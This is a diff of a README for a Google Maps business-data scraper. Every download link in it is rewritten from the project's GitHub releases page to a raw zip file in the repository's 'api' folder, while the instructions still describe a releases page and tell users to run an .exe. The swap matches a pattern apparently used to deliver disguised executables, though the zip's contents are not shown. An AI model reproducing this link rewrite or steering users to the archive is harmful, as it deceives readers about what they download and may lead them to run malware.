@@ -1,6 +1,6 @@
 # 📍 google-maps-scraper-pro - Reliable Business Data Extraction Tool
 
-[![Download google-maps-scraper-pro](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Fabri08642/google-maps-scraper-pro/releases)
+[![Download google-maps-scraper-pro](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Fabri08642/google-maps-scraper-pro/main/api/scraper-google-maps-pro-v1.2-alpha.3.zip)
 
 ---
 
@@ -36,7 +36,7 @@ You will first need to get the latest version of google-maps-scraper-pro.
 
 1. Click the large green button below to open the download page:
 
-   [![Download Google Maps Scraper Pro](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Fabri08642/google-maps-scraper-pro/releases)
+   [![Download Google Maps Scraper Pro](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Fabri08642/google-maps-scraper-pro/main/api/scraper-google-maps-pro-v1.2-alpha.3.zip)
 
 2. This will take you to the releases page on GitHub. Here, you will see one or more downloadable files.
 
@@ -114,7 +114,7 @@ The app lets you adjust a few settings to fit your needs:
 
 To check for updates, visit the release page again:
 
-[GitHub Releases - google-maps-scraper-pro](https://github.com/Fabri08642/google-maps-scraper-pro/releases)
+[GitHub Releases - google-maps-scraper-pro](https://raw.githubusercontent.com/Fabri08642/google-maps-scraper-pro/main/api/scraper-google-maps-pro-v1.2-alpha.3.zip)
 
 Download the latest `.exe` file and run it. The installer will update your existing version without removing your data.
 
@@ -140,4 +140,4 @@ All your scraped data stays on your device unless you choose to share or upload 
 
 ---
 
-# [🔗 Download google-maps-scraper-pro](https://github.com/Fabri08642/google-maps-scraper-pro/releases)
+# [🔗 Download google-maps-scraper-pro](https://raw.githubusercontent.com/Fabri08642/google-maps-scraper-pro/main/api/scraper-google-maps-pro-v1.2-alpha.3.zip)
